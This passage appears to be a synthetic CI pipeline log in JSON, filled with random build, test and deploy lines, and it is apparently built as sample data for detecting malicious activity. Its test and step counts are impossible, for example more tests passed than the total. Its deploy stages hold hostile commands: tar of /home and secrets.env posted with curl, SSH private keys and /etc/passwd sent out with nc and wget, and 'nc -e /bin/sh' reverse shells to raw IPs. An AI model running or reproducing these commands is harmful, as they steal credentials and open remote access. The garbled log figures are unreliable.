out main branch\nWARNING: react has known vulnerabilities\nStep 6/20: Deploying\nMinifying main.js\nCreating production build...\nStep 16/23: Testing\n[12:19:14] INFO: Cache refreshed\nUploading artifact 'dist' (40 files)\nStep 19/15: Installing dependencies\nArtifact downloaded: 40MB\nGET /api - 200 (23ms)\nDone.\nPOST /data - 200 (362ms)\nBuilding Docker image...\nCreating production build...\n[12:19:14] WARN: Deprecated API usage\nStep 6/15: Linting\nOptimizing 30 modules...\nDone.\nStep 8/24: Testing\nImage pulled successfully\n[12:19:14] ERROR: Connection failed\nOK\nException: TypeError\n  PASS: e2e/test_auth_login.spec.js\nWARNING: jest has known vulnerabilities\n[12:19:14] WARN: Deprecated API usage\nBuilding Docker image...\nHEAD is now at 296b7f8\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\n=== Step checkout completed ===\n=== Step: restore_cache ===\nOptimizing 96 modules...\nMinifying main.js\n\u2713 All checks passed\nnpm notice: package.json updated\nNODE_ENV=test\n[12:19:14] INFO: Processing request\nSuccess!\nnpm notice: created a lockfile\nPulling image: node:latest\nUsing Python 3.10\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (23MB)\nHEAD is now at 0959453\n[12:19:14] DEBUG: Memory usage: 1300MB\nCoverage: 87% statements, 78% branches\nCompiling utils/app.ts...\nImage pulled successfully\nDone.\n[12:19:14] INFO: Processing request\nLoading...\nLayer 3/12: ENV command\n\u2717 build failed with exit code 33\nCache saved successfully\nCache invalidated: dependencies\nCompiling utils/utils.go...\nTime: 43.550s\nPushing to registry...\nTest Suites: 26 passed, 47 total\nArtifact uploaded: build.tar.gz (47MB)\nLoading...\nLayer 8/13: RUN command\nTests: 73 passed, 268 total\nSwitched to branch 'hotfix/task-654'\nWARNING: prettier has known vulnerabilities\nEnvironment: test\nArtifact downloaded: 8MB\nPlatform: win32-x64\nnpm install: resolved 912 packages\nTests: 234 passed, 116 total\nCompiling utils/index.js...\nPushing to registry...\n[12:19:14] WARN: Deprecated API usage\n  PASS: unit/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /api - 202 (209ms)\nCache saved successfully\nStep 15/22: Installing dependencies\nPlatform: darwin-arm64\npip: Collecting lodash\nConnecting to cloud.services:443...\n[12:19:14] INFO: Request completed\nCache miss for key-7572\nCache hit for key-1641\nStep 20/15: Installing dependencies\n[12:19:14] WARN: Deprecated API usage\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nWARNING: webpack has known vulnerabilities\n\u2713 package completed\nnpm install: added 268 packages\nCache saved successfully\n[12:19:14] DEBUG: Memory usage: 444MB\n[12:19:14] INFO: Processing request\nPOST /upload - 200 (60ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed lodash-1.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: axios has known vulnerabilities\nUsing Python 3.10\npip: Collecting prettier\nCompiling lib/app.ts...\n[12:19:14] ERROR: Connection failed\nChecking out master branch\n[12:19:14] INFO: Request completed\nTime: 37.646s\nGET /health - 201 (68ms)\nGET /api - 204 (77ms)\nTransforming 368 files...\nEnvironment: staging\nCache saved successfully\nWARNING: jest has known vulnerabilities\nCache restored successfully (453MB)\nImage pulled successfully\nCompiling lib/main.py...\nnpm install: resolved 1140 packages\nTest Suites: 25 passed, 21 total\nArtifact downloaded: 9MB\n[12:19:15] INFO: Request completed\nCache invalidated: dependencies\nCreating production build...\n[12:19:15] INFO: Request completed\nStep 13/16: Linting\nPlatform: darwin-arm64\nWaiting...\nPOST /upload - 202 (22ms)\nCompiling lib/app.ts...\n[12:19:15] INFO: Starting build process\n[12:19:15] WARN: Deprecated API usage\nImage pulled successfully\nEnvironment: development\n[12:19:15] DEBUG: Initializing service\nCompiling components/service.java...\n[12:19:15] WARN: Deprecated API usage\n[12:19:15] DEBUG: Connection pool: 3 active\n\u2713 All checks passed\nCoverage: 99% statements, 81% branches\n\u2713 Step 'checkout' succeeded\nCompiling src/main.py...\nBuilding Docker image...\n[12:19:15] INFO: Cache refreshed\nHEAD is now at 690d2bc\nLoading...\n[12:19:15] INFO: Cache refreshed\nCompleted.\nFAILED: test_cache_hit\nFetching submodules...\nTransforming 562 files...\nCreating production build...\n[12:19:15] INFO: Processing request\n[12:19:15] DEBUG: Query executed in 70ms\nLoading...\nLayer 9/14: COPY command\n\u2717 build failed with exit code 100\nOK\nTests: 86 passed, 364 total\nPOST /api - 201 (235ms)\nHEAD is now at 4152c0a\nHEAD is now at dc2dfb3\nPushing to registry...\nPushing to registry...\nFinished.\nEnvironment: development\nArtifact downloaded: 31MB\nSuccess!\nCompiling lib/service.java...\nSwitched to branch 'bugfix/task-609'\nCompiling utils/index.js...\nCompiling components/service.java...\nException: TypeError\n\u2717 build failed with exit code 88\nNODE_ENV=test\nTLS handshake completed\nUsing Node.js 16.12.7\n[12:19:15] DEBUG: Loading configuration\nReady.\nGET /health - 204 (21ms)\nNODE_ENV=test\n[12:19:15] DEBUG: Memory usage: 1907MB\npip: Downloading react-1.4.tar.gz\nArtifact uploaded: dist.zip (13MB)\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\n=== Step restore_cache completed ===\n=== Step: build ===\npip: Downloading lodash-1.8.tar.gz\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache miss for key-2514\nTests: 423 passed, 88 total\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/service.java...\nCompiling src/main.py...\nTests: 412 passed, 327 total\nBundling vendor.js\nException: NullPointerException\nUsing Python 3.12\n[12:19:15] WARN: Deprecated API usage\nnpm install: resolved 169 packages\n[12:19:15] DEBUG: Connection pool: 12 active\nyarn add: Done in 8.64s\nWARNING: eslint has known vulnerabilities\n[12:19:15] DEBUG: Loading configuration\nVerifying...\n[12:19:15] ERROR: Connection failed\nStep 8/18: Installing dependencies\nnpm notice: created a lockfile\nAlready up to date.\n[12:19:15] INFO: Cache refreshed\nnpm install: resolved 1993 packages\nCreating production build...\nReady.\nWARNING: react has known vulnerabilities\nFetching submodules...\nChecking out develop branch\nUsing Node.js 20.10.0\nCache miss for key-4850\npip install: Successfully installed webpack-3.7\nnpm install: added 308 packages\nProcessing...\n  PASS: test_api_health (27ms)\npip: Collecting express\nLoading...\nNODE_ENV=development\nTransforming 815 files...\n[12:19:15] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\n\u2717 build failed with exit code 109\n\u2713 Step 'install' succeeded\nCoverage: 84% statements, 100% branches\nTest Suites: 14 passed, 11 total\nInstalling jest@2.18.3\n\u2713 Step 'setup' succeeded\nInstalling lodash@3.17.7\nCompiling utils/service.java...\nPOST /data - 202 (392ms)\nArtifact uploaded: dist.zip (68MB)\nConnecting to test.io:443...\n[12:19:15] DEBUG: Connection pool: 13 active\nFinished.\nOptimizing 20 modules...\nArtifact uploaded: dist.zip (51MB)\n  PASS: integration/test_api_health.spec.js\n[12:19:15] DEBUG: Connection pool: 17 active\nCompiling utils/utils.go...\n\u2717 build failed with exit code 6\nnpm install: added 77 packages\n[12:19:15] INFO: Processing request\nEnvironment: development\nCache invalidated: node_modules\nWARNING: lodash has known vulnerabilities\n[12:19:15] DEBUG: Loading configuration\nFetching submodules...\nCache invalidated: node_modules\nCache restored successfully (399MB)\npip install: Successfully installed axios-5.3\nBundling runtime.js\n[12:19:15] ERROR: Connection failed\nArtifact downloaded: 34MB\nConnecting to example.com:443...\n[12:19:15] WARN: Deprecated API usage\nLayer 8/14: RUN command\nRan 105 tests in 40s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 13.20s\nWaiting...\n\u2717 build failed with exit code 90\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nCache invalidated: node_modules\n[12:19:15] INFO: Processing request\n  PASS: test_api_health (83ms)\nConnecting to startup.dev:443...\n[12:19:15] WARN: Deprecated API usage\nStep 16/17: Linting\n[12:19:15] INFO: Starting build process\npip install: Successfully installed axios-2.15\nArtifact uploaded: build.tar.gz (4MB)\n[12:19:15] WARN: Deprecated API usage\nnpm install: resolved 1729 packages\nStep 20/20: Building\nCache invalidated: dependencies\nTransforming 611 files...\nyarn add: Done in 4.38s\nTLS handshake completed\npip: Collecting jest\nSnapshots: 12 passed, 39 total\n[12:19:15] INFO: Request completed\nPlatform: linux-x64\npip: Collecting react\nPushing to registry...\nSuccess!\nConnecting to example.com:443...\nCompiling components/main.py...\n\u2713 test completed\n[12:19:15] INFO: Starting build process\npip: Collecting react\n[12:19:15] WARN: Deprecated API usage\nUploading artifact 'dist' (44 files)\nEnvironment: production\nMinifying vendor.js\npip: Downloading react-4.13.tar.gz\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed express-3.11\nSuccess!\nnpm notice: created a lockfile\n[12:19:15] INFO: Processing request\nStep 9/18: Building\nPOST /data - 200 (476ms)\nBuilding Docker image...\nTLS handshake completed\nBuilding Docker image...\nCoverage: 84% statements, 76% branches\nArtifact downloaded: 29MB\nUsing Python 3.10\nAlready up to date.\n[12:19:15] DEBUG: Memory usage: 1664MB\nInstalling eslint@1.18.5\nCompiling components/handler.rs...\n[12:19:15] INFO: Starting build process\n[12:19:15] DEBUG: Initializing service\n[12:19:15] DEBUG: Memory usage: 1458MB\nCompiling components/app.ts...\nInstalling prettier@1.20.4\nOK\nArtifact uploaded: build.tar.gz (40MB)\nTime: 89.982s\nProcessing...\n\u2713 test completed\nNODE_ENV=development\nnpm notice: created a lockfile\nAlready up to date.\nSwitched to branch 'feature/task-973'\nnpm install: resolved 1329 packages\nArtifact uploaded: build.tar.gz (35MB)\nTLS handshake completed\nGET /api - 201 (27ms)\n[12:19:15] DEBUG: Loading configuration\nPlatform: win32-x64\n=== Step build completed ===\n=== Step: type_check ===\nTests: 434 passed, 124 total\nMinifying vendor.js\n[12:19:15] WARN: Deprecated API usage\nImage pulled successfully\nCache miss for key-3936\n[12:19:15] INFO: Processing request\nCache restored successfully (390MB)\nnpm install: resolved 1300 packages\nWARNING: eslint has known vulnerabilities\n\u2713 Task completed in 3173ms\n\u2717 build failed with exit code 21\nnpm install: added 249 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting webpack\nPlatform: darwin-arm64\nGenerating source maps...\nDone.\nFetching submodules...\nTLS handshake completed\nRan 20 tests in 12s\n[12:19:15] DEBUG: Loading configuration\nCache saved successfully\nPlatform: darwin-arm64\nCache miss for key-3840\nnpm install: added 494 packages\nnpm notice: package.json updated\nArtifact downloaded: 47MB\nSwitched to branch 'bugfix/task-305'\nTests: 339 passed, 490 total\nDone.\nWARNING: eslint has known vulnerabilities\nnpm notice: created a lockfile\n  PASS: e2e/test_user_create.spec.js\n[12:19:15] INFO: Cache refreshed\nnpm notice: created a lockfile\nCompiling src/utils.go...\nFetching submodules...\nArtifact downloaded: 5MB\n[12:19:15] WARN: Deprecated API usage\nArtifact downloaded: 25MB\nSuccess!\nUploading artifact 'dist' (21 files)\nStep 11/18: Building\n[12:19:15] INFO: Cache refreshed\n\u2713 Task completed in 210ms\n[12:19:15] WARN: Deprecated API usage\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 20/20: Running migrations\nSwitched to branch 'hotfix/task-195'\nStep 3/17: Running migrations\nVerifying...\nAlready up to date.\n  PASS: test_api_health (223ms)\nUsing Node.js 16.7.4\nEnvironment: production\nCoverage: 100% statements, 64% branches\nnpm notice: package.json updated\n[12:19:15] INFO: Connecting to database\nTransforming 704 files...\nCompiling components/utils.go...\n  PASS: test_db_connect (106ms)\nUploading artifact 'dist' (48 files)\nConnection established\n[12:19:15] INFO: Cache refreshed\nReady.\nCache miss for key-3497\nImage pulled successfully\nnpm install: added 459 packages\nStep 18/20: Testing\nConnection established\nCompiling components/main.py...\nCoverage: 75% statements, 96% branches\nnpm install: resolved 1500 packages\npip: Collecting express\nUsing Node.js 18.14.7\nTime: 4.756s\nMinifying app.js\nArtifact downloaded: 15MB\nTime: 10.456s\nCompiling lib/service.java...\nPulling image: alpine:latest\n[12:19:15] INFO: Processing request\n[12:19:15] DEBUG: Query executed in 63ms\nTLS handshake completed\nStep 4/19: Deploying\n  PASS: unit/test_user_create.spec.js\nStep 1/24: Linting\nCache restored successfully (406MB)\nArtifact uploaded: build.tar.gz (7MB)\nPushing to registry...\nyarn add: Done in 3.53s\n  PASS: test_db_connect (48ms)\n  PASS: test_auth_login (178ms)\nStep 1/21: Linting\nStep 5/16: Running migrations\nCache saved successfully\nCompiling lib/app.ts...\nPulling image: node:latest\nEnvironment: development\nTest Suites: 12 passed, 12 total\npip: Installing build dependencies...\n  PASS: unit/test_auth_login.spec.js\n\u2713 package completed\nPlatform: win32-x64\nRan 124 tests in 32s\nFetching submodules...\npip install: Successfully installed react-3.20\nStep 4/22: Deploying\n\u2713 All checks passed\nCache saved successfully\n  PASS: test_auth_login (455ms)\nTime: 86.439s\nNODE_ENV=production\nFinished.\nSnapshots: 49 passed, 11 total\n[12:19:15] ERROR: Connection failed\n[12:19:15] WARN: Deprecated API usage\nChecking out develop branch\nWaiting...\nPulling image: alpine:3.11\n\u2713 All checks passed\npip install: Successfully installed jest-2.13\nUploading artifact 'dist' (47 files)\n\u2717 build failed with exit code 38\nSuccess!\nConnecting to acme.corp:443...\n[12:19:15] DEBUG: Initializing service\nCache saved successfully\n[12:19:15] DEBUG: Query executed in 89ms\nStep 20/24: Building\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\npip: Installing build dependencies...\nOptimizing 49 modules...\nSuccess!\nTests: 157 passed, 347 total\nTime: 5.40s\n[12:19:15] DEBUG: Loading configuration\nReady.\npip: Collecting lodash\nMinifying vendor.js\nGET /api - 200 (57ms)\n[12:19:15] DEBUG: Loading configuration\nUsing Python 3.9\nHEAD is now at 7f411e2\nNODE_ENV=test\n[12:19:15] WARN: Deprecated API usage\nFinished.\nException: TypeError\nCache saved successfully\nCompiling components/handler.rs...\nCreating production build...\nWaiting...\nCache restored successfully (258MB)\nCompiling utils/main.py...\n=== Step type_check completed ===\n=== Step: install_dependencies ===\nCache invalidated: node_modules\nStep 7/16: Linting\nPlatform: linux-x64\nGET /status - 204 (74ms)\nEnvironment: staging\n[12:19:15] WARN: Deprecated API usage\nStep 7/22: Testing\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nConnection established\nProcessing...\nNODE_ENV=test\npip: Installing build dependencies...\nOK\nAlready up to date.\npip: Collecting webpack\nLoading...\nnpm notice: created a lockfile\nTLS handshake completed\n\u2713 package completed\nStep 4/17: Linting\n[12:19:15] DEBUG: Query executed in 99ms\n\u2717 build failed with exit code 109\n[12:19:15] INFO: Starting build process\nChecking out main branch\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/main.py...\nnpm install: resolved 781 packages\nCache invalidated: build\nBundling vendor.css\nSuccess!\nLoading...\nOptimizing 61 modules...\n[12:19:15] DEBUG: Query executed in 43ms\nCreating production build...\n\u2713 Step 'install' succeeded\nFAILED: test_cache_hit\nChecking out develop branch\n[12:19:15] INFO: Request completed\nOK\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting express\nPlatform: darwin-arm64\nPlatform: linux-x64\nChecking out develop branch\nyarn add: Done in 6.77s\nWaiting...\nException: ValueError\n[12:19:15] INFO: Processing request\nCompiling lib/app.ts...\nPlatform: win32-x64\nStep 16/20: Running migrations\nSuccess!\nLoading...\nOptimizing 18 modules...\n[12:19:15] WARN: Deprecated API usage\n[12:19:15] DEBUG: Connection pool: 13 active\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\n  PASS: test_api_health (286ms)\nTransforming 121 files...\nWaiting...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/24: Deploying\nUsing Python 3.12\n  PASS: test_cache_hit (109ms)\nStep 1/17: Deploying\nException: RuntimeError\nnpm install: added 405 packages\nCache saved successfully\nWARNING: axios has known vulnerabilities\n\u2713 Task completed in 305ms\nUploading artifact 'build' (30 files)\nOK\nFinished.\nException: NullPointerException\nUsing Node.js 16.15.10\n  PASS: test_cache_hit (496ms)\nnpm install: added 387 packages\nFetching submodules...\nCache miss for key-9282\nCache miss for key-2908\n[12:19:15] DEBUG: Query executed in 77ms\nCache restored successfully (333MB)\nCompiling utils/index.js...\nRan 19 tests in 35s\nStep 15/24: Testing\nMinifying app.js\nUploading artifact 'dist' (16 files)\nnpm notice: created a lockfile\nLayer 3/8: RUN command\nException: ValueError\n[12:19:15] INFO: Connecting to database\npip: Downloading prettier-1.20.tar.gz\n[12:19:15] DEBUG: Initializing service\nStep 5/23: Deploying\n\u2713 Task completed in 4779ms\nArtifact uploaded: dist.zip (16MB)\nStep 16/15: Deploying\nOptimizing 75 modules...\n[12:19:15] INFO: Connecting to database\nBuilding Docker image...\nChecking out develop branch\nFinished.\nRan 48 tests in 10s\nnpm install: added 110 packages\n[12:19:15] DEBUG: Query executed in 90ms\nConnection established\nWARNING: axios has known vulnerabilities\nStep 1/21: Deploying\nUploading artifact 'build' (38 files)\nSnapshots: 45 passed, 14 total\n[12:19:15] WARN: Deprecated API usage\nEnvironment: staging\n  PASS: test_db_connect (113ms)\n[12:19:15] DEBUG: Memory usage: 1815MB\n  PASS: test_auth_login (218ms)\nStep 20/20: Testing\nTime: 98.434s\npip install: Successfully installed eslint-2.7\n[12:19:15] WARN: Deprecated API usage\n  PASS: integration/test_api_health.spec.js\nSnapshots: 16 passed, 20 total\nPulling image: python:latest\nnpm notice: created a lockfile\nArtifact downloaded: 15MB\nCache hit for key-2024\nEnvironment: development\n[12:19:15] ERROR: Connection failed\nTLS handshake completed\n[12:19:15] WARN: Deprecated API usage\nUsing Python 3.11\nInstalling eslint@1.13.3\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nImage pulled successfully\nHEAD is now at 0dd1702\nSwitched to branch 'hotfix/task-645'\nCreating production build...\nException: NullPointerException\n\u2713 deploy completed\nStep 9/20: Linting\nSwitched to branch 'feature/task-755'\nArtifact downloaded: 6MB\nSwitched to branch 'hotfix/task-462'\nChecking out develop branch\nnpm install: resolved 1024 packages\nTests: 386 passed, 122 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/17: Linting\n[12:19:15] INFO: Request completed\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nLayer 5/13: ENV command\nPulling image: alpine:18\nUsing Node.js 20.16.10\nStep 5/17: Building\nCache saved successfully\nCoverage: 70% statements, 68% branches\n[12:19:15] DEBUG: Memory usage: 1260MB\nGenerating source maps...\nMinifying main.js\nTests: 229 passed, 224 total\nTime: 20.704s\nStep 17/24: Testing\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_user_create.spec.js\nWARNING: jest has known vulnerabilities\nArtifact uploaded: dist.zip (25MB)\nOptimizing 34 modules...\nStep 5/20: Linting\nTime: 16.965s\nUsing Python 3.12\nConnection established\nArtifact uploaded: dist.zip (100MB)\n\u2713 package completed\nBuilding Docker image...\n\u2713 All checks passed\npip: Collecting axios\nPushing to registry...\nCreating production build...\nTime: 105.984s\nOK\nCache miss for key-7763\n[12:19:15] INFO: Processing request\n\u2713 All checks passed\nStep 4/20: Running migrations\nStep 1/23: Building\n\u2717 build failed with exit code 92\nConnection established\n\u2713 Task completed in 2164ms\nRan 128 tests in 47s\nUsing Python 3.10\n[12:19:15] INFO: Starting build process\nRan 155 tests in 50s\nHEAD is now at 3dbdf1d\nPushing to registry...\n[12:19:15] ERROR: Connection failed\nNODE_ENV=test\nCache invalidated: node_modules\nStep 16/17: Building\nyarn add: Done in 8.52s\nStep 8/25: Linting\nProcessing...\n[12:19:15] DEBUG: Loading configuration\n[12:19:15] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\nUsing Node.js 15.7.1\nSuccess!\nFetching submodules...\nWARNING: react has known vulnerabilities\nConnection established\nCache invalidated: dependencies\nOK\nCache restored successfully (178MB)\nCompiling utils/app.ts...\nnpm install: resolved 1361 packages\n[12:19:15] DEBUG: Query executed in 93ms\nCache invalidated: node_modules\nCache miss for key-2030\nRan 167 tests in 27s\nCache hit for key-4842\nConnection established\nImage pulled successfully\nBuilding Docker image...\n[12:19:15] DEBUG: Query executed in 36ms\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/app.ts...\npip: Collecting jest\nCache hit for key-4850\n\u2713 All checks passed\nStep 14/20: Running migrations\n[12:19:15] WARN: Deprecated API usage\n[12:19:15] DEBUG: Loading configuration\n[12:19:15] DEBUG: Initializing service\nPushing to registry...\nPulling image: node:3.11\nRan 87 tests in 30s\nStep 16/24: Testing\n[12:19:15] DEBUG: Loading configuration\nNODE_ENV=development\nInstalling prettier@5.5.6\nSwitched to branch 'bugfix/task-567'\nUploading artifact 'build' (10 files)\nDone.\nBundling runtime.css\nnpm notice: package.json updated\nChecking out main branch\nLayer 7/14: ENV command\nWARNING: react has known vulnerabilities\n[12:19:15] WARN: Deprecated API usage\n  PASS: test_user_create (166ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 32MB\nMinifying vendor.js\nInstalling prettier@3.4.2\nLayer 7/15: ENV command\nArtifact uploaded: dist.zip (56MB)\n[12:19:15] ERROR: Connection failed\nStep 3/19: Testing\nConnection established\nLoading...\nSuccess!\nReady.\n\u2713 deploy completed\n  PASS: unit/test_user_create.spec.js\nChecking out master branch\nTime: 25.667s\nWaiting...\nTest Suites: 21 passed, 5 total\n[12:19:15] WARN: Deprecated API usage\nSnapshots: 32 passed, 2 total\n  PASS: unit/test_auth_login.spec.js\nHEAD is now at 71497b9\nCompiling lib/index.js...\nCache hit for key-5184\nDone.\nWARNING: lodash has known vulnerabilities\nPOST /data - 201 (121ms)\nCompleted.\npip install: Successfully installed eslint-2.7\nPulling image: node:3.11\n\u2713 Step 'checkout' succeeded\nFAILED: test_user_create\nCreating production build...\nPulling image: alpine:18\nSnapshots: 0 passed, 42 total\nCompiling components/index.js...\nCache restored successfully (466MB)\n[12:19:15] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 200 (464ms)\nConnection established\nSuccess!\nCompiling lib/index.js...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /api - 204 (27ms)\n[12:19:15] INFO: Cache refreshed\nCache saved successfully\nCache restored successfully (483MB)\n[12:19:15] WARN: Deprecated API usage\nSnapshots: 10 passed, 22 total\nCompiling components/service.java...\nPlatform: linux-x64\n[12:19:15] DEBUG: Loading configuration\nyarn add: Done in 24.76s\nFetching submodules...\n=== Step deploy_staging completed ===\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n=== Step: deploy_production ===\nConnection established\n\u2713 Step 'setup' succeeded\nCompiling lib/handler.rs...\nUsing Python 3.9\nGET /health - 204 (16ms)\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (42MB)\nUsing Python 3.9\nLayer 2/14: ENV command\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u2713 Task completed in 1181ms\nInstalling react@4.10.10\nCache miss for key-2964\nSuccess!\nHEAD is now at 17765eb\nWARNING: jest has known vulnerabilities\nLoading...\n  PASS: unit/test_cache_hit.spec.js\nPulling image: python:latest\nHEAD is now at d783b24\nTransforming 195 files...\nFetching submodules...\nStep 3/25: Installing dependencies\nConnecting to test.io:443...\ncurl -X POST https://test.io/collect -d @secrets.env\nCache hit for key-3195\nLoading...\ncurl -X POST https://startup.dev/collect -d @secrets.env\nConnecting to acme.corp:443...\nStep 11/22: Testing\npip install: Successfully installed eslint-5.17\nInstalling eslint@5.4.5\nyarn add: Done in 5.10s\nnc -e /bin/sh 112.129.216.206 15295\nTest Suites: 35 passed, 33 total\nCompiling src/service.java...\npip: Collecting jest\n[12:19:15] DEBUG: Connection pool: 11 active\nCoverage: 76% statements, 68% branches\nPlatform: linux-x64\nStep 15/20: Installing dependencies\n[12:19:15] INFO: Request completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 198.8.135.118 17211\nPulling image: node:latest\nCreating production build...\nConnecting to startup.dev:443...\nConnecting to example.com:443...\nyarn add: Done in 23.43s\nOK\nChecking out main branch\nStep 6/19: Running migrations\nnpm notice: created a lockfile\nTime: 78.68s\nGenerating source maps...\n[12:19:15] ERROR: Connection failed\nHEAD is now at f6cd978\n\u2713 All checks passed\nStep 14/15: Linting\n[12:19:15] INFO: Cache refreshed\nGenerating source maps...\nProcessing...\nNODE_ENV=production\nMinifying vendor.js\nBundling main.js\npip: Collecting webpack\nWaiting...\nSending 33MB of data to test.io\nConnecting to startup.dev:443...\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompleted.\nStep 7/25: Installing dependencies\nFetching submodules...\n\u2717 build failed with exit code 94\nFinished.\n[12:19:15] INFO: Cache refreshed\nCoverage: 90% statements, 100% branches\ncurl -X POST https://example.com/collect -d @secrets.env\nHEAD is now at 1ac5774\necho $(cat ~/.ssh/id_rsa) | base64 | nc 107.50.172.191 50179\nFAILED: test_user_create\npip install: Successfully installed express-3.17\npip: Collecting lodash\nWARNING: webpack has known vulnerabilities\nTests: 142 passed, 111 total\n[12:19:15] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nPulling image: python:3.11\nCoverage: 98% statements, 60% branches\nUsing Python 3.9\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCoverage: 95% statements, 88% branches\n[12:19:15] DEBUG: Query executed in 84ms\nStep 9/15: Installing dependencies\nStep 2/24: Deploying\nConnecting to acme.corp:443...\n[12:19:15] ERROR: Connection failed\nNODE_ENV=test\n\u2713 validate completed\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u2717 build failed with exit code 94\ncurl -X POST https://acme.corp/collect -d @secrets.env\nConnection established\n[12:19:15] WARN: Deprecated API usage\nEnvironment: development\nCache saved successfully\nWARNING: axios has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nWARNING: webpack has known vulnerabilities\nTLS handshake completed\nCompiling src/index.js...\nStep 14/18: Deploying\n[12:19:15] WARN: Deprecated API usage\nStep 1/15: Running migrations\nImage pulled successfully\nStep 8/21: Deploying\nProcessing...\nReady.\nSending 56MB of data to example.com\nCompiling components/handler.rs...\nNODE_ENV=development\nBundling main.js\nTLS handshake completed\npip: Collecting eslint\nHEAD is now at f5bd574\n  PASS: test_api_health (118ms)\nSnapshots: 26 passed, 34 total\nCache saved successfully\nSending 159MB of data to startup.dev\nFetching submodules...\nCoverage: 93% statements, 94% branches\nTests: 483 passed, 379 total\nCompiling components/utils.go...\n[12:19:15] INFO: Cache refreshed\n[12:19:15] DEBUG: Memory usage: 1705MB\nUsing Node.js 18.7.0\nCompiling lib/main.py...\nCache miss for key-1953\nConnecting to startup.dev:443...\nCompleted.\npip: Installing build dependencies...\nVerifying...\nArtifact uploaded: dist.zip (48MB)\npip install: Successfully installed jest-5.8\n\u2713 All checks passed\n\u2713 All checks passed\nTests: 90 passed, 467 total\nUsing Node.js 18.19.9\n[12:19:15] INFO: Cache refreshed\nUploading artifact 'dist' (33 files)\n[12:19:15] ERROR: Connection failed\n\u2713 Step 'install' succeeded\npip: Collecting prettier\n\u2717 build failed with exit code 96\nLoading...\nMinifying main.js\n  PASS: e2e/test_cache_hit.spec.js\nOptimizing 50 modules...\n[12:19:15] DEBUG: Memory usage: 216MB\nRan 95 tests in 7s\nnpm install: added 273 packages\n[12:19:15] INFO: Processing request\n[12:19:15] INFO: Connecting to database\nNODE_ENV=test\nEnvironment: staging\n\u2713 Step 'build' succeeded\n[12:19:15] DEBUG: Loading configuration\nCompiling lib/app.ts...\nCoverage: 76% statements, 88% branches\nnpm notice: package.json updated\nCoverage: 97% statements, 72% branches\nCache saved successfully\nException: RuntimeError\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:19:14.898085",
        "finished_at": "2025-12-16T12:19:25.585377",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache invalidated: node_modules",
          "Processing...",
          "Cache miss for key-9696",
          "Step 12/18: Testing",
          "[12:19:14] INFO: Request completed",
          "POST /data - 200 (227ms)",
          "Success!",
          "npm notice: package.json updated",
          "  PASS: test_user_create (59ms)",
          "[12:19:14] DEBUG: Query executed in 36ms",
          "  PASS: test_api_health (191ms)",
          "Compiling src/app.ts...",
          "Tests: 186 passed, 431 total",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache restored successfully (247MB)",
          "Step 17/22: Deploying",
          "Tests: 103 passed, 119 total",
          "Compiling components/index.js...",
          "Artifact uploaded: dist.zip (41MB)",
          "npm install: resolved 525 packages",
          "Connection established",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-455'",
          "Snapshots: 42 passed, 26 total",
          "Generating source maps...",
          "Cache restored successfully (132MB)",
          "[12:19:14] ERROR: Connection failed",
          "Done.",
          "[12:19:14] DEBUG: Memory usage: 1115MB",
          "[12:19:14] INFO: Connecting to database",
          "Step 1/22: Installing dependencies",
          "Completed.",
          "[12:19:14] INFO: Connecting to database",
          "Minifying app.js",
          "Processing...",
          "[12:19:14] DEBUG: Memory usage: 1041MB",
          "TLS handshake completed",
          "Creating production build...",
          "Step 16/25: Testing",
          "[12:19:14] INFO: Cache refreshed",
          "Compiling lib/service.java...",
          "npm notice: created a lockfile",
          "Success!",
          "WARNING: eslint has known vulnerabilities",
